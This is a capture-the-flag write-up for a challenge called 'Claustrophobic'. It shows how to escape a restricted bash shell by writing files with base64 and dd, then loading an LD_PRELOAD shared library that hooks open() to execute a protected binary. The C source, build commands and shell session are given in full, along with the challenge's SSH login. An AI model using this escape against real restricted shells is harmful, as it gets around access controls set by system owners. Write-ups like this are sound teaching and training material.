# Claustrophobic - Pwn/misc (250)

Santa is stuck in a chimney and needs your help to escape

Service: ssh -p 1218 claus@3.81.191.176 (password: ClausTrophobic)

## Survey

Connecting to the server, you're presented with a restricted bash shell. Many commands you'd normally use (like `cd`, `cp`, etc) are restricted or unavailable. You're dropped into the home directory for the user and there is an executable file `print_flag` in your current directory so the solution to this challenge is obviously to execute this file. Unfortunately, the only file in your `$PATH` which you can execute from is `/home/claus/bin`.

```bash
claus@1218_claustrophobic:/home/claus$ ls -l
total 20
drwxr-xr-x 1 root root  4096 Dec 18 11:53 bin
--wx--x--x 1 root root 14368 Dec 18 07:33 print_flag
claus@1218_claustrophobic:/home/claus$ ./print_flag 
rbash: ./print_flag: restricted: cannot specify `/' in command names
claus@1218_claustrophobic:/home/claus$ /home/claus/print_flag 
rbash: /home/claus/print_flag: restricted: cannot specify `/' in command names
claus@1218_claustrophobic:/home/claus$ print_flag
rbash: print_flag: command not found
claus@1218_claustrophobic:/home/claus$ echo $PATH
/home/claus/bin
claus@1218_claustrophobic:/home/claus$ ls -l $PATH 
total 0
lrwxrwxrwx 1 root root 15 Dec 18 11:53 base64 -> /usr/bin/base64
lrwxrwxrwx 1 root root  8 Dec 18 11:53 cat -> /bin/cat
lrwxrwxrwx 1 root root  7 Dec 18 11:53 dd -> /bin/dd
lrwxrwxrwx 1 root root 11 Dec 18 11:53 id -> /usr/bin/id
lrwxrwxrwx 1 root root  7 Dec 18 11:53 ls -> /bin/ls
lrwxrwxrwx 1 root root  8 Dec 18 11:53 pwd -> /bin/pwd
lrwxrwxrwx 1 root root 15 Dec 18 11:53 whoami -> /usr/bin/whoami
```

## Writing Files

After poking around a while, we find that its possible to write files using `echo` or `base64` and `dd`. A couple examples are shown below.

```bash
claus@1218_claustrophobic:/home/claus$ echo 'aaaa' | dd of=aaa.dat
0+1 records in
0+1 records out
5 bytes copied, 5.6838e-05 s, 88.0 kB/s
claus@1218_claustrophobic:/home/claus$ cat aaa.dat 
aaaa
claus@1218_claustrophobic:/home/claus$ base64 -d | dd of=bbb.dat
YmJiCg==
0+1 records in
0+1 records out
4 bytes copied, 4.29101 s, 0.0 kB/s
claus@1218_claustrophobic:/home/claus$ cat bbb.dat 
bbb
claus@1218_claustrophobic:/home/claus$ 
```

## Arbitrary Executing

The final trick for this challenge is to leverage the file write into arbitrary execution using `LD_PRELOAD`. There are a couple examples you can find on the internet, but I chose to take craft a shared library which overwrote the `open` libc function. In the new shared object I simply have my `open` execute the `print_flag` file as shown below.

```bash
john@john-virtual-machine:~$ cat inspect_open.c 
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>

typedef int (*orig_open_f_type)(const char *pathname, int flags);

int open(const char *pathname, int flags, ...)
{
  /* Some evil injected code goes here. */
  printf("The victim used open(...) to access '%s'!!!\n",pathname); //remember to include stdio.h!
  execl("/home/claus/print_flag", "print_flag", (char*)0);
  orig_open_f_type orig_open;
  orig_open = (orig_open_f_type)dlsym(RTLD_NEXT,"open");
  return orig_open(pathname,flags);
}
john@john-virtual-machine:~$ gcc -shared -fPIC  inspect_open.c -o inspect_open.so -ldl
john@john-virtual-machine:~$ base64 inspect_open.so 
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA8AUAAAAAAABAAAAAAAAAAEgYAAAAAAAAAAAAAEAAOAAH
AEAAHAAbAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlAgAAAAAAACUCAAAAAAAAAAA
IAAAAAAAAQAAAAYAAAAADgAAAAAAAAAOIAAAAAAAAA4gAAAAAAA4AgAAAAAAAEACAAAAAAAAAAAg
AAAAAAACAAAABgAAABAOAAAAAAAAEA4gAAAAAAAQDiAAAAAAANABAAAAAAAA0AEAAAAAAAAIAAAA
...
```

Then on the target service I wrote the shared object as shown previously and load it into `cat` which attempts to open a file. Once the new `open` function executes it calls `print_flag` which shows the flag.

```bash
claus@1218_claustrophobic:/home/claus$ base64 -d | dd of=inspect_open.so
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA8AUAAAAAAABAAAAAAAAAAEgYAAAAAAAAAAAAAEAAOAAH
AEAAHAAbAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlAgAAAAAAACUCAAAAAAAAAAA
IAAAAAAAAQAAAAYAAAAADgAAAAAAAAAOIAAAAAAAAA4gAAAAAAA4AgAAAAAAAEACAAAAAAAAAAAg
AAAAAAACAAAABgAAABAOAAAAAAAAEA4gAAAAAAAQDiAAAAAAANABAAAAAAAA0AEAAAAAAAAIAAAA
AAAAAAQAAAAEAAAAyAEAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAA
...
AAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAAKAUAAAAAAAAaAAAAKgAAAAgA
AAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACQFQAAAAAAAMQBAAAAAAAAAAAA
AAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAVBcAAAAAAADxAAAA
AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==
15+1 records in
15+1 records out
8008 bytes (8.0 kB, 7.8 KiB) copied, 15.0314 s, 0.5 kB/s
claus@1218_claustrophobic:/home/claus$ LD_PRELOAD=/home/claus/inspect_open.so cat .bashrc
The victim used open(...) to access '.bashrc'!!!
AOTW{pr0c_s3lf_m3m3s}
AOTW{pr0c_s3lf_m3m3s}
```